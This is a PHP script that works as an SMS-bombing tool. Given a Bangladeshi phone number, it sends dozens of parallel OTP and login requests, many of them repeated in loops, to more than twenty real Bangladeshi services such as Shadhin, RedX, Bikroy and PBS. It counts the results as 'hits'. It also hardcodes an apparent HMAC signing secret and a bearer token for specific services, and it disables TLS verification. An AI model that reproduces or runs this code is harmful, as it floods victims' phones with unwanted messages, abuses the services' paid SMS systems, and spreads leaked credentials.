<?php
header('Content-Type: application/json');
error_reporting(E_ALL);
ini_set('display_errors', 0); 
set_time_limit(0); 

$phone = $_GET['phone'] ?? '';

if(!preg_match('/^(?:\+?88)?01[3-9]\d{8}$/', $phone)){
    die(json_encode(["status" => "error", "message" => "Invalid phone number."]));
}

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;

$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    
$phone_fundesh = substr($phone_11, 1);    

$api_requests = [];

// ==========================================
// 🔴 ১-৫: ফিক্সড সার্ভিসসমূহ (Swap, Ali2BD, Hishabee, PBS, Shadhin)
// ==========================================
$api_requests[] = ["name"=>"ali2bd_1","url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login","method"=>"POST","data"=>["username"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://ali2bd.com']];

$swap_secret = "UFNyP1f+s2bjwVAFbOBv87a142orsWLt7X/4M7pMVyE="; 
$swap_timestamp = (string) time(); 
$swap_signature = base64_encode(hash_hmac('sha256', $deepto_number . $swap_timestamp, $swap_secret, true));
$api_requests[] = ["name"=>"swap_1","url"=>"https://api.swap.com.bd/api/v1/send-otp/v2","method"=>"POST","data"=>["phone"=>$deepto_number,"timestamp"=>(int)$swap_timestamp],"headers"=>['Content-Type:application/json','signature:'.$swap_signature]];

$api_requests[] = ["name"=>"hishabee_1","url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88","method"=>"POST","headers"=>['Content-Type:application/json','Origin:https://web.hishabee.business']];

for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"pbs_$i","url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP","method"=>"POST","data"=>["userPhone"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://pbs.com.bd']];

for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"shadhin_$i","url"=>"https://connect.shadhinmusic.com/v1/api//otp/send","method"=>"POST","data"=>["msisdn"=>$phone_88],"headers"=>['Content-Type:application/json','Origin:https://shadhinmusic.com']];

// ==========================================
// 🟡 ৬-১১: বেশি লুপের সার্ভিসসমূহ
// ==========================================
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"redx_$i","url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json','Origin:https://redx.com.bd']];
for($i=1;$i<=10;$i++) $api_requests[] = ["name"=>"bikroy_$i","url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11","method"=>"GET"];
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"bdtickets_$i","url"=>"https://api.bdtickets.com/v1/auth","method"=>"POST","data"=>["phoneNumber"=>$phone_plus88,"applicationChannel"=>"WEB_APP"],"headers"=>['Content-Type:application/json','Origin:https://bdtickets.com']];
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"shwapno_$i","url"=>"https://www.shwapno.com/api/auth","method"=>"POST","data"=>["phoneNumber"=>$phone_plus88],"headers"=>['Content-Type:application/json','cookie: cuid=98a49521-6662-498f-94eb-17d71974083f']];
for($i=1;$i<=5;$i++) $api_requests[] = ["name"=>"garibook_$i","url"=>"https://api.garibookadmin.com/api/v4/user/login","method"=>"POST","data"=>["mobile"=>$phone_plus88,"channel"=>"web"],"headers"=>['Content-Type:application/json']];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"deeptoplay_$i","url"=>"https://api.deeptoplay.com/v2/auth/login?platform=web","method"=>"POST","data"=>["number"=>$deepto_number],"headers"=>['Content-Type:application/json','Origin:https://www.deeptoplay.com']];

// ==========================================
// 🟢 ১২-১৬: অন্যান্য সার্ভিস
// ==========================================
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"shikho_$i","url"=>"https://api.shikho.com/auth/v2/send/sms","method"=>"POST","data"=>["phone"=>$phone_88,"type"=>"student","auth_type"=>"signup"],"headers"=>['Content-Type:application/json']];
for($i=1;$i<=3;$i++) $api_requests[] = ["name"=>"iqra_$i","url"=>"https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,"method"=>"GET"];
$api_requests[] = ["name"=>"osudpotro_1","url"=>"https://api.osudpotro.com/api/v1/users/send_otp","method"=>"POST","data"=>["mobile"=>$phone_osudpotro,"deviceToken"=>"web_browser","os"=>"web"],"headers"=>['Content-Type:application/json']];
$api_requests[] = ["name"=>"apex4u_1","url"=>"https://api.apex4u.com/api/auth/login","method"=>"POST","data"=>["phoneNumber"=>$phone_11],"headers"=>['Content-Type:application/json']];
$api_requests[] = ["name"=>"fundesh_1","url"=>"https://fundesh.com.bd/api/auth/generateOTP","method"=>"POST","data"=>["msisdn"=>$phone_fundesh],"headers"=>['Content-Type:application/json','Origin:https://fundesh.com.bd']];

// ==========================================
// 🔵 নতুন সার্ভিস (Shomvob & Chorki)
// ==========================================
for($i=1;$i<=3;$i++) {
    $api_requests[] = ["name"=>"shomvob_$i", "url"=>"https://backend-api.shomvob.co/api/v2/otp/phone", "method"=>"POST", "data"=>["phone"=>"88".$phone_11, "is_retry"=>0], "headers"=>['Content-Type:application/json', 'Authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY1OTg5NTcwOH0.IOdKen62ye0N9WljM_cj3Xffmjs3dXUqoJRZ_1ezd4Q']];
}
$api_requests[] = ["name"=>"chorki_1", "url"=>"https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "method"=>"POST", "data"=>["number"=>$phone_plus88], "headers"=>['Content-Type:application/json', 'Origin:https://www.chorki.com']];

// ==========================================
// ⚡ Parallel Execution Engine
// ==========================================
$mh = curl_multi_init(); $handles = [];
foreach($api_requests as $key => $api){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $headers = $api['headers'] ?? [];
    $headers[] = 'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if(isset($api['method']) && $api['method'] === "POST"){
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data']));
    }
    $handles[$key] = $ch;
    curl_multi_add_handle($mh, $ch);
}

$running = null;
do { curl_multi_exec($mh, $running); curl_multi_select($mh); } while ($running > 0);

$final_results = [];
foreach($handles as $key => $ch){
    $final_results[$api_requests[$key]['name']] = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo json_encode(["status" => "success", "total_hits" => count($api_requests), "results" => $final_results], JSON_PRETTY_PRINT);
?>
